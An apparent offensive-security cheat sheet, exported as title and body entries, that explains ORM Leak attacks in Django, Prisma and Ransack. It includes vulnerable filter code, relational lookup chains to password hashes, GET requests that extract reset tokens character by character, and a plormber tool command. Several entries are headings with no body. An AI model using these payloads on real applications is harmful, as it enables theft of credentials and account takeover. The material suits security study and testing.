entries.title: What is ORM Leak
entries.body:
ORM Leak is a leak of sensitive data (DB structure, other users' fields: passwords, hashes, reset tokens) that arises from passing user input into ORM queries insecurely.
The typical root of the problem: the application accepts a filter/parameters from the request and directly expands them into the ORM filter/where, giving the attacker control over the column and the comparison operator.
Even if the field is not returned in the response, its value is exfiltrated character by character: you guess a prefix via __startswith / startsWith / *_start, and based on the reaction (results present / none) you reconstruct the value in full.

entries.title: Where to look for ORM Leak
entries.body:
• Endpoints where the filter comes from the body/query and lands directly in the ORM (filter(**request.data), where: req.query.filter, q[...] in Ransack).
• Search/listings with arbitrary filtering parameters (?filter[...], ?q[...]).
• Parameters with double underscores (Django: field__lookup) or nested objects (Prisma: {field:{startsWith:...}}).
• Related models: filters on relational fields (created_by__user__password) let you reach other people's records.
• Targets for exfiltration: password / password hash, reset_password_token / resetToken, recoveries_key, any secrets in neighboring tables.

entries.title: Exfiltration channels (how to reconstruct a value)
entries.body:
Boolean-based  filter by prefix: results present in the response = character guessed, empty = no. You iterate over the alphabet by positions.
Time-based     a conditional delay via a heavy regex/contains; a guessed prefix -> timeout. For blind cases with no visible difference in the response.
Error-based    a broken regex (ReDOS) crashes the query into a 500 when the condition matches - yes/no based on whether the error occurs.
Algorithm: you fix the known prefix, iterate over the next character from a set (e.g. hex 0123456789abcdef for tokens/hashes), repeat until the end of the string.

entries.title: Vulnerable pattern - filter(**request.data)
entries.body:
users = User.objects.filter(**request.data)
serializer = UserSerializer(users, many=True)

entries.title: Django - note on the vulnerability
entries.body: The problem is in how the Django ORM builds a QuerySet via keyword arguments. The unpacking operator (**) gives the user control over the names of the keyword arguments of filter() - and therefore over the column and the lookup operator.

entries.title: Query filter - filter by someone else's column
Useful Django lookup operators
entries.body:
The ORM provides operators for partial matching of a value: SQL LIKE, regex by a user-supplied pattern, < and > comparisons.
Interesting filters:
* __startswith
* __contains
* __regex

entries.title: Relational Filtering - types of relations
entries.body:
Through relational filters you can reach the fields of related models (including other users). Example models from the writeup by Alex Brown (elttam, "plORMbing your Django ORM").
Two types of relations:
* One-to-One
* Many-to-Many

entries.title: Relational - One-to-One (leaking an article author's password)
Relational - Many-to-Many (chain of filters)
entries.body:
Almost the same, but you need to filter deeper.
* Get user IDs: created_by__departments__employees__user__id
* For each ID get the username:  created_by__departments__employees__user__username
* Finally, leak the password hash:          created_by__departments__employees__user__password

entries.title: Relational - Many-to-Many (several filters in one query)
Error-based leaking - ReDOS (MySQL)
ReDOS - note
entries.body: If Django works with MySQL, you can abuse ReDOS: when the filter does not match the condition, a heavy regex crashes the query into an error (timeout). The difference "response present / 500" gives a boolean oracle for character-by-character exfiltration.

entries.title: Vulnerable pattern - where: req.query.filter
Prisma - include all fields of a related record
Prisma - select a specific field (password)
Relational - One-to-One (query-string)
entries.body: filter[createdBy][resetToken][startsWith]=06

entries.title: Relational - Many-to-Many (nested some)
Ransack - applicability condition
entries.body:
Vulnerable only in Ransack < 4.0.0.
Exfiltration goes through predicates in the q[...] parameters: *_start (starts with), *_cont (contains). Based on the presence/absence of results on the page you guess the value character by character.

entries.title: Ransack - extracting reset_password_token
entries.body:
GET /posts?q[user_reset_password_token_start]=0 -> Empty results page
GET /posts?q[user_reset_password_token_start]=1 -> Empty results page
GET /posts?q[user_reset_password_token_start]=2 -> Results in page

GET /posts?q[user_reset_password_token_start]=2c -> Empty results page
GET /posts?q[user_reset_password_token_start]=2f -> Results in page

entries.title: Ransack - targeting a specific user + recoveries_key
entries.body: GET /labs?q[creator_roles_name_cont]=​superadmin​​&q[creator_recoveries_key_start]=0

entries.title: plormber (Prisma, time-based)
entries.body: elttam/plormber - a tool for exploiting time-based ORM Leak. https://github.com/elttam/plormber

entries.title: plormber - example run (prisma-contains)
entries.body:
plormber prisma-contains \
    --chars '0123456789abcdef' \
    --base-query-json '{"query": {PAYLOAD}}' \
    --leak-query-json '{"createdBy": {"resetToken": {"startsWith": "{ORM_LEAK}"}}}' \
    --contains-payload-json '{"body": {"contains": "{RANDOM_STRING}"}}' \
    --verbose-stats \
    https://some.vuln.app/articles/time-based;
